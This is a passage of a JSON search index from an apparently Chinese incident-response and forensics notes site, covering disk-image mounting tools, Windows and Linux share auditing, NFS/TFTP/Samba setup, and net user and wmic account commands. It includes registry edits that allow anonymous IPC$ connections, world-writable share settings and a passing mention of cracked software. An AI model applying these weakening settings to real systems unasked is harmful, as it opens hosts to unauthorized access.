    "content": " 工具名 支持的系统 收费情况 支持挂载镜像的格式 Arsenal Image Mounter win 收费，有破解工具 .dd(RAW).AFF4.E01/.Ex01 .VHD/VDI/XVA/VMDK/OVA.AVHD/AVHDX GetData Mount Image Pro win 收费 .AD1.DMG.E01/Ex01/L01/Lx01.aff.ISO .VHD/.VHDX.NUIX/MFS01ProDiscoverSMARTDD(RAW)VMWareXways OSFMount win 免费 .img/.dd.iso/.bin.00n.NRG.AFF.AFM.AFD.VMDK.E01.S01.VHD Mount command linux linux自带 .raw/img/iso ",
    "description": "",
    "tags": null,
    "title": "磁盘挂载工具特点对比表",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD%E5%B7%A5%E5%85%B7%E7%89%B9%E7%82%B9%E5%AF%B9%E6%AF%94%E8%A1%A8/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "社科",
    "uri": "/%E7%A4%BE%E7%A7%91/index.html"
  },
  {
    "content": "windows系统共享 net share 查询 查看系统中所有共享\nnet share 通过命令看到所有盘符都是默认共享 IPC$空连接尤为不安全,所以我们要关闭默认共享\n删除共享命令\nnet share 共享名 /del wmic share查询 C:\\Users\\xt\u003ewmic share get name,path,status Name Path Status ADMIN$ C:\\WINDOWS OK C$ C:\\ OK IPC$ OK Users C:\\Users OK get-wmiobject查询（powershell） get-wmiobject -class Win32_share 注册表查询 目前找到的资料只知道在创建自定义的共享文件的时候，下面这个注册表内容会有变化\nDelegateFolders\n\u003ereg query “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\DelegateFolders” /s\n实测确实会有变化，从注册表方式查询共享文件内容方式暂时无法继续。\n开启系统默认共享 开启系统的默认共享（Admin$、C$）的方法\n# 默认共享开启自动开启，在系统重启的时候自动打开 reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0x01 reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0x01 # IPC$共享开启，设置命名管道设置为0，不限制 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\" /v restrictanonymous /t REG_DWORD /d 0x00 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v restrictanonymous /t REG_DWORD /d 0x00 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v restrictanonymous /t REG_DWORD /d 0x004.重启。通常Win2003、Win2000\\XP会在启动时自动创建。 5.启动后，可以通过运行CMD命令进入命令行模式，再运行net share，再共享列表中会看到Admin$、C$等默认共享。\n三：也可以在开始菜单的运行中输入CMD，然后输入以下的命令 net share c$=c: net share d$=d: net share ipc$\n关闭系统共享 清除系统默认共享（Admin$、C$）：\n# 默认共享（c$、admin$）关闭（2003取消ipc$方式也是这个） reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0x00 reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0x00 限制ipc$共享 通过限制命名空间限制ipc$共享 IPC$限制使用关闭有些服务，必须要求启动IPC$共享命名管道，特别是一些微软出品的应用软件。如微软的SQL Server数据库，必须要启用IPC$共享命名管道。否则的话，数据库就无法正常运行。IPC$共享命名管道，也是SQL Server数据库与微软服务器操作系统无缝集成的一个通道。“HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa”。在这一项内容中，有一个叫做restrictanonymous的键值。如果设置为\"1\"，一个匿名用户仍然可以连接到IPC$共享，但无法通过这种连接得到列举SAM帐号和共享信息的权限；在Windows 2000 中增加了\"2\"，未取得匿名权的用户将不能进行ipc$空连接。建议设置为1。如果上面所说的主键不存在，就新建一个再改键值。\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\" /v restrictanonymous /t REG_DWORD /d 0x01 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v restrictanonymous /t REG_DWORD /d 0x01 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v restrictanonymous /t REG_DWORD /d 0x01 以上注册表关闭IPC$的方式并不能清除共享，只能限制匿名用户枚举sam用户通过临时关闭服务或删除服务对本次启动的服务进行限制 限制ipc$共享/停止ipc$共享基于的服务server，但是重启仍然会自动开启，根据资料将HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/LanmanServer/Parameters其中的AutoShareWks和AutoShareServer的值都改成0，只能在重启后禁止自动打开默认共享，对于IPC$共享并不会起作用。\nnet share ipc$ /delete net stop server原理参考：\nhttps://blog.csdn.net/shenshaojun/article/details/111280025\nhttps://blog.csdn.net/wudibaobei8/article/details/2898754?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.base\u0026depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.base\nnet view查询（远程） net view \\\nnet view /workgroup:\n其中 \u003cworkgroupname\u003e 是要查看其共享资源的工作组名。除了不能查看工作组列表外，可以使用 NET VIEW 命令执行“网上邻居”或“我的电脑”中的大部分可用浏览功能。如果不带命令行参数，或者带 /WORKGROUP 开关参数使用 NET VIEW 命令，可以看到一组计算机列表，其中左列是计算机名，右列是标记。除使用 Microsoft 网络用户之外，如果还使用 NetWare 网络用户，可以在“其它服务器”下看到 NetWare (NCP) 服务器列表。 如果使用 NET VIEW 命令和计算机名，可以看到该计算机上的可用资源列表。如果使用 Microsoft Client for Microsoft Networks 和 Microsoft Client for NetWare Networks，计算机名可以是 SMB (Microsoft) 或 NCP (NetWare) 计算机名。 如果使用 NET VIEW 命令和您的计算机名，可以看到您计算机上的共享资源列表。 如果使用 NET USE 命令，可以看到网络连接状态、连接的本地名（映射的驱动器号）和连接的远程名（UNC 服务器位置）。NET VIEW命令使用格式如下:\n1.NET VIEW　[\\\\computername [/CACHE] | /DOMAIN[:domainname]] 2.NET VIEW /NETWORK:NW [\\\\computername] /domain[:domainname] 指定要查看其可用计算机的域或工作组。如果省略 DomainName，/domain 将显示网络上的所有域或工作组名。 /network:nw 显示 NetWare 网络上所有可用的服务器。如果指定计算机名，/network:nw 将通过 NetWare 网络显示该计算机上的可用资源。也可以指定添加到系统中的其他网络。下面是一些net view命令的使用范例:\n1.查看由 \\\\Production 计算机共享的资源列表 net view \\\\production 2.查看 NetWare 服务器 \\\\Marketing 上的可用资源 net view /network:nw \\\\marketing 3.查看sale域或工作组中的计算机列表 net view /domain:sales 4.查看 NetWare 网络中的所有服务器 net view /network:nwlinux系统共享 NFS服务 网络文件系统（NFS，Network File System）是一种将远程主机上的分区（目录）经网络挂载到本地系统的一种机制，通过对网络文件系统的支持，用户可以在本地系统上像操作本地分区一样来对远程主机的共享分区（目录）进行操作。\n安装nfs服务端 sudo apt install nfs-kernel-server配置 创建导出目录（共享的目录成为导出目录）。这里新建一个共享文件用于测试共享文件/mnt/linuxshare目录下创建个sharetest.txt\n# 创建共享文件目录 sudo mkdir -p /mnt/linuxshare sudo touch /mnt/linuxshare/sharetest.txt # 修改文件夹权限 sudo chown nobody:nogroup /mnt/linuxshare sudo chmod 777 /mnt/linuxshare修改nfs配置文件/etc/exports，添加如下一行\n/home/yourname/sharedir 10.1.60.34(rw,sync,no_root_squash)\n/mnt/linuxshare 10.211.55/24(rw,sync,no_subtree_check)\n注意，上面的主机IP不能使用＊来通配，在客户机上会导致出现拒绝访问，使用子网掩码例如：10.1.60.0/255.255.254.0即可让10.1.60.*和10.1.61.*都可以访问,还可以使用10.1.60/23这种方式类确定子网。\n启动服务 测试配置文件\n$sudo exportfs -r\n$sudo /etc/init.d/portmap start\n$sudo /etc/init.d/nfs-kernel-server start\n打开防火墙限制 sudo ufw allow from 10.211.55.0/24 to any port nfs其他情况 启动nfs出现以下错误，前提防火墙已经关闭，其他机器有mount要先umount\nStarting NFS daemon: [FAILED]\n然后重启nfs\n/etc/init.d/portmap stop\n/etc/init.d/nfs stop\n如果仍然存在nfsd进程则需要手动全部kill\nps -ef | grep nfs\n参考：\nhttps://developer.aliyun.com/article/459761\nnfs原理https://blog.csdn.net/qq_38265137/article/details/83146421\n安装nfs客户端 安装客户端 linux\nsudo apt-get install nfs-commonwindows\n在功能处\n连接共享 mount \\\\10.211.55.14\\mnt\\linuxshare k:\\ showmount查看共享（只能查nfs） 只能查询到nfs共享\nshowmount -e TFTP服务 TFTP（Trivial File Transfer Protocol，简单文件传输协议），是一个基于UDP 协议实现的用于在客户机和服务器之间进行简单文件传输的协议，适合于开销不大、不复杂的应用场合。TFTP 协议专门为小文件传输而设计，只能从服务器上获取文件，或者向服务器写入文件，不能列出目录，也不能进行认证。\n参考链接：https://blog.csdn.net/zhuisaozhang1292/article/details/83047365\n服务端搭建 安装 安装tftp-hpa,tftpd-hpa,前面的是客户端，后面的是服务程序, 安装好xinetd\nsudo apt-get install tftp-hpa tftpd-hpa sudo apt-get install xinetd配置 配置/etc/xinetd.conf vim /etc/xinetd.conf 配置服务器相关配置/etc/default/tftpd-hpa，可以看到默认配置tftp的服务端目录为/srv/tftp（默认随程序安装目录就已经创建）\n# /etc/default/tftpd-hpa TFTP_USERNAME=\"tftp\" TFTP_DIRECTORY=\"/srv/tftp\" TFTP_ADDRESS=\":69\" TFTP_OPTIONS=\"--secure\" 配置/etc/xinetd.d/tftp 如果文件不存在就创建一个，需要注意修改的是server_args项目改成本地tftp配置中的TFTP_DIRECTORY中的值，这里是“/srv/tftp”。\nservice tftp { socket_type =dgram protocol =udp wait =yes user =root server =/usr/sbin/in.tftpd server_args =-s /srv/tftp -c disable =no per_source =11 cps =100 2 flags =IPv4 }启动服务 sudo service tftpd-hpa restart sudo /etc/init.d/xinetd reload sudo /etc/init.d/xinetd restart客户端配置： 客户端安装 linux\nsudo apt-get install tftp-hpawindows\n# 命令行安装 pkgmgr /iu:\"TFTP\" 连接tftp 在tftp服务器的tftp的根目录创建testftp.txt作为测试文件。因为tftp无法列出文件目录的文件列，因此需要指定文件下载。\nwindows下连接下载文件\ntftp 10.211.55.14 get testftp.txt linux下连接下载文件\ntftp 127.0.0.1 tftp\u003e get testftp.txt\t参考：\nhttps://www.cnblogs.com/andriod-html5/archive/2012/05/07/2539224.html\nhttps://blog.csdn.net/liruishen79/article/details/19035319\nsamba服务 Samba是用来实现SMB的一种软件，SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。Samba服务可用于将linux文件系统作为CIFS/SMB网络文件共享进行共享，并将linux打印机作为CIFS/SMB打印机共享进行共享。\n参考：https://blog.csdn.net/zxy15771771622/article/details/78734299\n安装samba服务端 安装 sudo apt-get install samba 安装完执行，samba确认已完成安装 samba配置 主要配置文件：\n/etc/samba/smb.conf NetBIOS名与主机的对应关系： /etc/samba/lmhosts共享 直接将需要共享的目录写入/etc/samba/smb.conf即可。\n将文件中的内容做如下相应修改： #security=user 后面添加： security=share 在文件结尾添加如下行：\n[sambashare] comment = samba home directory path = /home/sambashare public = yes browseable = yes public = yes writeable = yes read only = no valid users = parallels create mask = 0777 directory mask = 0777 #force user = nobody #force group = nogroup available = yes 注意：[sambashare] 这个地方不能有空格，客户端在定位服务器中目录的位置就通过这个[]中间的值进行定位，形如\\\\ip\\[值]来进行访问，中括号中不能带有空格，否则windows下会有问题，\n保存退出，启动Samba服务：\n/etc/init.d/samba-ad-dc startsamba客户端 连接共享 为了测试在home下创建sambashare目录匹配配置中的path内容，用于作为sambashare的目录，并创建sambasharetest.txt文件作为测试文件\nwindows下文件资源管理器中\\10.211.55.14\\sambashare即可\n参考：\nhttps://blog.csdn.net/littesss/article/details/85222601\ndf查询（无法查询上面的3中服务） df命令用来查看系统的space和inode使用情况,也是常用命令之一\n-a 显示所有的文件系统,包括本地的和挂载的网络文件系统\n-h 显示大小的时候,以人性化的方式来显示,以更适合的方式来显示\n-T 现实文件系统类型\n-t 显示指定的文件系统\n-l 只显示本地文件系统\n-k 以KB为单位显示\n-x 不显示指定的文件系统\n-i 显示inode使用情况\n综上： 通过对windows和linux共享服务的过程查询可知：\nwindows下查询共享通过net share、wmic share、get-wmiobject方式查询，linux下查询共享只能通过先判断启用了那种共享服务然后根据配置文件定位共享目录判断共享内容。\n",
    "description": "",
    "tags": null,
    "title": "系统共享检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E5%85%B1%E4%BA%AB%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "windows查看用户 whoami 查看当前用户 net user 命令释义 查阅官网文档\nnet user [\u003cUserName\u003e {\u003cPassword\u003e | *} [\u003cOptions\u003e]] [/domain] net user [\u003cUserName\u003e {\u003cPassword\u003e | *} /add [\u003cOptions\u003e] [/domain]] net user [\u003cUserName\u003e [/delete] [/domain]] 参数 描述 \u003cUserName\u003e 指定用户账户名字用于添加/删除/修改/查看。账户名称最多20字符。 \u003cPassword\u003e 分配/修改用户账户密码。password参数输入*，会产生一个前端的提示，“请输入密码 ： ”，这时输入的密码均不会出现原文，密码输入均以不可见方式输入，并且系统会要求两次输入确保输入无误。 /domain 在计算机的主域的域控制器上执行操作。 \u003cOptions\u003e 指定命令行选项。关于命令行选项语法的描述请参见下表。 net help \u003cCommand\u003e 显示指定net命令的帮助。 命令行选项语法 描述 /active: {no | yes} 启用或禁用用户帐户。如果该用户帐户未激活，则该用户无法访问计算机上的资源。默认为yes(即活动)。 /comment: \"\u003cText\u003e\" 提供关于用户帐户的描述性注释。这个注释最多可以有48个字符。将文本用引号括起来。 /countrycode: \u003cNNN\u003e 使用操作系统国家/地区代码实现用户帮助和错误消息的指定语言文件。0表示默认的国家/地区代码。 expires: \u003cMM\\/DD\\/YYYY\u003e | \u003cDD/MM/YYYY\u003e | \u003cmmm,dd,YYYY\u003e | never 如果指定日期，则导致用户帐户过期。根据国家/地区代码的不同，过期日期的格式可以是[MM/DD/YYYY]、[DD/MM/YYYY]或[mmm, DD,YYYY]。请注意，帐户将在指定日期开始时过期。对于月份值，您可以使用数字，拼写出来，或者使用三个字母的缩写(即，Jan, Feb, Mar, Apr, May, Jun, Jul, Aug, Sep, Oct, Nov, Dec)。可以使用两个或四个数字作为年份值。使用逗号或斜杠来分隔日期。不要使用空格。如果忽略\u003cYYYY\u003e，则假定该日期(即，根据您计算机的日期和时间)的下一个出现。例如，以下条目在1994年1月10日和1995年1月8日之间输入是等价的: jan,91/9/95january,9,19951/9 /fullname: “\u003cName\u003e” 指定用户的全名而不是用户名。将名称用引号括起来。 /homedir: \u003cPath\u003e 设置用户的主目录的路径。该路径必须已经存在。 /passwordchg: {yes | no} 指定用户是否可以修改自己的密码。默认为yes。 /passwordreq: {yes | no} 指定用户帐户是否必须有密码。默认为yes。 /profilepath: [\u003cPath\u003e] 设置用户登录配置文件的路径。这个路径指向一个注册表配置文件。 /scriptpath: \u003cPath\u003e 设置用户登录脚本的路径。\u003c路径\u003e不能是绝对路径。\u003cPath\u003e相对于%systemroot%\\System32\\Repl\\Import\\Scripts。 /times: {\u003cDay\u003e[\u003c-Day\u003e][,\u003cDay\u003e[-\u003cDay\u003e]],\u003cTime\u003e[-\u003cTime\u003e][,\u003cTime\u003e[-\u003cTime\u003e]][;] | all} 指定允许用户使用计算机的次数。\u003c \u003e时间限制为1小时递增。对于\u003cDay\u003e值，您可以拼写出日期的名称或使用缩写(即M、T、W、Th、F、Sa、Su)。您可以使用12小时或24小时表示法表示小时。如果您使用12小时表示法，请使用AM和PM，或A.M.和P.M.值all表示用户始终可以登录。空值(空白)意味着用户永远不能登录。用逗号分隔日和时间，用分号分隔日和时间的单位(例如，M,4AM-5PM;T,1PM-3PM)。在指定的时间不要使用空格。 /usercomment: \"\u003cText\u003e\" 指定管理员可以为该帐户添加或更改“用户评论”。将文本用引号括起来。 /workstations: {\u003cComputerName\u003e[,...] | *} 列出用户可以从其中登录到网络的至多8个工作站。列表中的多个条目用逗号分隔。如果/工作站没有列表或列表是星号(*)，则用户可以从任何计算机登录。 常用语句 以下示例显示本地计算机的所有用户帐户列表: net user 显示用户账号tommyh的信息，示例如下: net user tommyh 下面的示例为一个用户添加了一个用户帐户，该用户的全名是Jay Jamison，用户名是jayj，拥有从周一到周五上午8点到下午5点的登录权限(时间指定中没有空格)，一个强制密码(Cyk4^g3B)和用户的全名: net user jayj Cyk4^g3B /add /passwordreq: yes /times: monday-friday,8am-5pm /fullname: \"Jay Jamison\" 下面的示例使用24小时表示法设置miked的登录时间(8 A.M.到5 P.M.): net user miked /time: M-F,08: 00-17: 00 下面的示例使用12小时表示法设置miked的登录时间(8 A.M.到5 P.M.): net user miked /time: M-F,8AM-5PM 以下示例指定的登录时间为: 星期一早上4点到下午5点，星期二下午1点到下午3点，星期三到星期五上午8点到下午5点。 net user anibals /time: M,4AM-5PM;T,1PM-3PM;W-F,8: 00-17: 00 net localgroup 用户组 这里也同样到官方查看相关用法，可以在这里找到：https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11)\n命令释义 net localgroup [\u003cGroupName\u003e [/comment: \"\u003cText\u003e\"]] [/domain] net localgroup [\u003cGroupName\u003e {/add [/comment: \"\u003cText\u003e\"] | /delete} [/domain] net localgroup [\u003cGroupName\u003e \u003cName\u003e […] {/add | /delete} [/domain] \u003cGroupName\u003e 指定要添加、展开或删除的本地组的名称。net localgroup \u003cGroupName\u003e显示本地组中用户或全局组的列表，无需附加参数。 /comment: \"\u003cText\u003e\" 为新组或现有组添加注释。备注最多256个字符。将文本用引号括起来。 /domain 在当前域的主域控制器上执行该操作。否则，操作将在本地执行。 \u003cName\u003e[ ...] 列出要从本地组中添加或删除的一个或多个用户名或组名。 /add 将全局组名或用户名添加到本地组。在使用此命令将用户或全局组添加到本地组之前，必须先为用户或全局组建立帐户。 /delete 从本地组中移除组名或用户名。 net help \u003cCommand\u003e 显示指定net命令的帮助。常用语句 以下示例将名为Exec的本地组添加到本地用户帐户数据库，输入: Net localgroup exec /add . Net 以下示例将名为Exec的本地组添加到域用户帐户数据库，输入: Net localgroup exec /add /domain 以下示例将现有用户帐户stevev、ralphr(来自Sales域)和jennyt添加到本地计算机上的Exec本地组，输入: Net localgroup exec stevev sales\\ralphr jennyt /add 以下示例将现有用户帐户stevev、ralphr和jennyt添加到域的Exec组中，输入: Net localgroup exec stevev ralphr jennyt /add /domain 以下示例显示Exec本地组中的用户，输入: net localgroup exec 以下示例向Exec本地组记录添加注释，输入: net localgroup exec /comment: “行政人员。”wmic useraccount（可审影子账户） wmic 也常被用于后渗透阶段系统快速信息收集，我们仍然先从基本命令入手\ncommand \u003c/parameter\u003e 子命令 描述 class 转义WMIC的默认别名模式，以直接访问WMI模式中的类。 path 转义WMIC的默认别名模式，以直接访问WMI模式中的实例。 context 显示所有全局开关的当前值。 [quit | exit] 退出WMIC命令shell。 参数 描述 \u003c/parameter\u003e \u003c简明描述，以动词\u003e开头 \u003c/param2\u003e \u003c另一个简明的描述，以动词\u003e开头 \u003e wmic /? [全局开关] \u003c命令\u003e 可以使用以下全局开关: /NAMESPACE 别名在其上操作的命名空间的路径。 /ROLE 包含别名定义的角色的路径。 /NODE 别名在其上操作的服务器。 /IMPLEVEL 客户端模拟级别。 /AUTHLEVEL 客户端身份验证级别。 /LOCALE 客户端应使用的语言 ID。 /PRIVILEGES 启用或禁用所有权限。 /TRACE 将调试信息输出到 stderr。 /RECORD 记录所有输入命令和输出内容。 /INTERACTIVE 设置或重置交互模式。 /FAILFAST 设置或重置 FailFast 模式。 /USER 会话期间要使用的用户。 /PASSWORD 登录会话时要使用的密码。 /OUTPUT 指定输出重定向模式。 /APPEND 指定输出重定向模式。 /AGGREGATE 设置或重置聚合模式。 /AUTHORITY 指定连接的 \u003c授权类型\u003e。 /?[: \u003cBRIEF|FULL\u003e] 用法信息。 有关特定全局开关的详细信息，请键入: switch-name /? 当前角色中可以使用以下别名: ALIAS - 对本地系统上可用别名的访问 BASEBOARD - 基板(也称为主板或系统板)管理。 BIOS - 基本输入/输出服务(BIOS)管理。 BOOTCONFIG - 启动配置管理。 CDROM - CD-ROM 管理。 COMPUTERSYSTEM - 计算机系统管理。 CPU - CPU 管理。 CSPRODUCT - SMBIOS 中的计算机系统产品信息。 DATAFILE - 数据文件管理。 DCOMAPP - DCOM 应用程序管理。 DESKTOP - 用户的桌面管理。 DESKTOPMONITOR - 桌面监视器管理。 DEVICEMEMORYADDRESS - 设备内存地址管理。 DISKDRIVE - 物理磁盘驱动器管理。 DISKQUOTA - 用于 NTFS 卷的磁盘空间使用量。 DMACHANNEL - 直接内存访问(DMA)通道管理。 ENVIRONMENT - 系统环境设置管理。 FSDIR - 文件系统目录项管理。 GROUP - 组帐户管理。 IDECONTROLLER - IDE 控制器管理。 IRQ - 中断请求线路(IRQ)管理。 JOB - 提供对使用计划服务安排的作业的访问。 LOADORDER - 定义执行依赖关系的系统服务的管理。 LOGICALDISK - 本地存储设备管理。 LOGON - 登录会话。 MEMCACHE - 缓存内存管理。 MEMORYCHIP - 内存芯片信息。 MEMPHYSICAL - 计算机系统的物理内存管理。 NETCLIENT - 网络客户端管理。 NETLOGIN - 网络登录信息(属于特定用户)管理。 NETPROTOCOL - 协议(及其网络特征)管理。 NETUSE - 活动网络连接管理。 NIC - 网络接口控制器(NIC)管理。 NICCONFIG - 网络适配器管理。 NTDOMAIN - NT 域管理。 NTEVENT - NT 事件日志中的项目。 NTEVENTLOG - NT 事件日志文件管理。 ONBOARDDEVICE - 主板(系统板)中内置的通用适配器设备的管理。 OS - 已安装操作系统的管理。 PAGEFILE - 虚拟内存文件交换管理。 PAGEFILESET - 页面文件设置管理。 PARTITION - 物理磁盘的已分区区域的管理。 PORT - I/O 端口管理。 PORTCONNECTOR - 物理连接端口管理。 PRINTER - 打印机设备管理。 PRINTERCONFIG - 打印机设备配置管理。 PRINTJOB - 打印作业管理。 PROCESS - 进程管理。 PRODUCT - 安装程序包任务管理。 QFE - 快速修复工程。 QUOTASETTING - 卷上的磁盘配额设置信息。 RDACCOUNT - 远程桌面连接权限管理。 RDNIC - 对特定网络适配器的远程桌面连接管理。 RDPERMISSIONS - 特定远程桌面连接的权限。 RDTOGGLE - 远程打开或关闭远程桌面侦听程序。 RECOVEROS - 操作系统出现故障时将从内存收集的信息。 REGISTRY - 计算机系统注册表管理。 SCSICONTROLLER - SCSI 控制器管理。 SERVER - 服务器信息管理。 SERVICE - 服务应用程序管理。 SHADOWCOPY - 卷影副本管理。 SHADOWSTORAGE - 卷影副本存储区域管理。 SHARE - 共享资源管理。 SOFTWAREELEMENT - 系统上安装的软件产品元素的管理。 SOFTWAREFEATURE - SoftwareElement 的软件产品子集的管理。 SOUNDDEV - 声音设备管理。 STARTUP - 当用户登录到计算机系统时自动运行的命令的管理。 SYSACCOUNT - 系统帐户管理。 SYSDRIVER - 基本服务的系统驱动程序管理。 SYSTEMENCLOSURE - 物理系统外壳管理。 SYSTEMSLOT - 物理连接点(包括端口、插槽和外设以及专用连接点)的管理。 TAPEDRIVE - 磁带驱动器管理。 TEMPERATURE - 温度传感器(电子温度计)数据管理。 TIMEZONE - 时区数据管理。 UPS - 不间断电源(UPS)管理。 USERACCOUNT - 用户帐户管理。 VOLTAGE - 电压传感器(电子电压表)数据管理。 VOLUME - 本地存储卷管理。 VOLUMEQUOTASETTING - 将磁盘配额设置与特定磁盘卷相关联。 VOLUMEUSERQUOTA - 每用户存储卷配额管理。 WMISET - WMI 服务操作参数管理。 有关特定别名的详细信息，请键入: alias /? CLASS - 按 Esc 键可获取完整 WMI 架构。 PATH - 按 Esc 键可获取完整 WMI 对象路径。 CONTEXT - 显示所有全局开关的状态。 QUIT/EXIT - 退出程序。 有关 CLASS/PATH/CONTEXT 的详细信息，请键入: (CLASS | PATH | CONTEXT) /?常用语句 \u003e wmic useraccount - 用户帐户管理（可审影子账户） wmic SYSACCOUNT - 系统帐户管理 wmic GROUP - 组帐户管理 wmic NETLOGIN - 网络登录信息(属于特定用户)管理 wmic VOLUMEUSERQUOTA - 每用户存储卷配额管理。如下所示：\nC: \\Users\\xt\u003ewmic useraccount AccountType Caption Description Disabled Domain FullName InstallDate LocalAccount Lockout Name PasswordChangeable PasswordExpires PasswordRequired SID SIDType Status 512 DESKTOP-D9ITQNU\\Administrator 管理计算机(域)的内置帐户 TRUE DESKTOP-D9ITQNU TRUE FALSE Administrator TRUE FALSE TRUE S-1-5-21-1907407323-3790588764-1508052843-500 1 Degraded 512 DESKTOP-D9ITQNU\\DefaultAccount 系统管理的用户帐户。 TRUE DESKTOP-D9ITQNU TRUE FALSE DefaultAccount TRUE FALSE FALSE S-1-5-21-1907407323-3790588764-1508052843-503 1 Degraded 512 DESKTOP-D9ITQNU\\Guest 供来宾访问计算机或访问域的内置帐户 TRUE DESKTOP-D9ITQNU TRUE FALSE Guest FALSE FALSE FALSE S-1-5-21-1907407323-3790588764-1508052843-501 1 Degraded 512 DESKTOP-D9ITQNU\\WDAGUtilityAccount 系统为 Windows Defender 应用程序防护方案管理和使用的用户帐户。 TRUE DESKTOP-D9ITQNU TRUE FALSE WDAGUtilityAccount TRUE TRUE TRUE S-1-5-21-1907407323-3790588764-1508052843-504 1 Degraded 512 DESKTOP-D9ITQNU\\xt FALSE DESKTOP-D9ITQNU TRUE FALSE xt TRUE TRUE FALSE S-1-5-21-1907407323-3790588764-1508052843-1000 1 OK C: \\Users\\xt\u003ewmic SYSACCOUNT Caption Description Domain InstallDate LocalAccount Name SID SIDType Status DESKTOP-D9ITQNU\\Everyone DESKTOP-D9ITQNU\\Everyone DESKTOP-D9ITQNU TRUE Everyone S-1-1-0 5 OK DESKTOP-D9ITQNU\\LOCAL DESKTOP-D9ITQNU\\LOCAL DESKTOP-D9ITQNU TRUE LOCAL S-1-2-0 5 OK DESKTOP-D9ITQNU\\CREATOR OWNER DESKTOP-D9ITQNU\\CREATOR OWNER DESKTOP-D9ITQNU TRUE CREATOR OWNER S-1-3-0 5 OK DESKTOP-D9ITQNU\\CREATOR GROUP DESKTOP-D9ITQNU\\CREATOR GROUP DESKTOP-D9ITQNU TRUE CREATOR GROUP S-1-3-1 5 OK DESKTOP-D9ITQNU\\CREATOR OWNER SERVER DESKTOP-D9ITQNU\\CREATOR OWNER SERVER DESKTOP-D9ITQNU TRUE CREATOR OWNER SERVER S-1-3-2 5 OK DESKTOP-D9ITQNU\\CREATOR GROUP SERVER DESKTOP-D9ITQNU\\CREATOR GROUP SERVER DESKTOP-D9ITQNU TRUE CREATOR GROUP SERVER S-1-3-3 5 OK DESKTOP-D9ITQNU\\OWNER RIGHTS DESKTOP-D9ITQNU\\OWNER RIGHTS DESKTOP-D9ITQNU TRUE OWNER RIGHTS S-1-3-4 5 OK DESKTOP-D9ITQNU\\DIALUP DESKTOP-D9ITQNU\\DIALUP DESKTOP-D9ITQNU TRUE DIALUP S-1-5-1 5 OK DESKTOP-D9ITQNU\\NETWORK DESKTOP-D9ITQNU\\NETWORK DESKTOP-D9ITQNU TRUE NETWORK S-1-5-2 5 OK DESKTOP-D9ITQNU\\BATCH DESKTOP-D9ITQNU\\BATCH DESKTOP-D9ITQNU TRUE BATCH S-1-5-3 5 OK DESKTOP-D9ITQNU\\INTERACTIVE DESKTOP-D9ITQNU\\INTERACTIVE DESKTOP-D9ITQNU TRUE INTERACTIVE S-1-5-4 5 OK DESKTOP-D9ITQNU\\SERVICE DESKTOP-D9ITQNU\\SERVICE DESKTOP-D9ITQNU TRUE SERVICE S-1-5-6 5 OK DESKTOP-D9ITQNU\\ANONYMOUS LOGON DESKTOP-D9ITQNU\\ANONYMOUS LOGON DESKTOP-D9ITQNU TRUE ANONYMOUS LOGON S-1-5-7 5 OK DESKTOP-D9ITQNU\\PROXY DESKTOP-D9ITQNU\\PROXY DESKTOP-D9ITQNU TRUE PROXY S-1-5-8 5 OK DESKTOP-D9ITQNU\\SYSTEM DESKTOP-D9ITQNU\\SYSTEM DESKTOP-D9ITQNU TRUE SYSTEM S-1-5-18 5 OK DESKTOP-D9ITQNU\\ENTERPRISE DOMAIN CONTROLLERS DESKTOP-D9ITQNU\\ENTERPRISE DOMAIN CONTROLLERS DESKTOP-D9ITQNU TRUE ENTERPRISE DOMAIN CONTROLLERS S-1-5-9 5 OK DESKTOP-D9ITQNU\\SELF DESKTOP-D9ITQNU\\SELF DESKTOP-D9ITQNU TRUE SELF S-1-5-10 5 OK DESKTOP-D9ITQNU\\Authenticated Users DESKTOP-D9ITQNU\\Authenticated Users DESKTOP-D9ITQNU TRUE Authenticated Users S-1-5-11 5 OK DESKTOP-D9ITQNU\\RESTRICTED 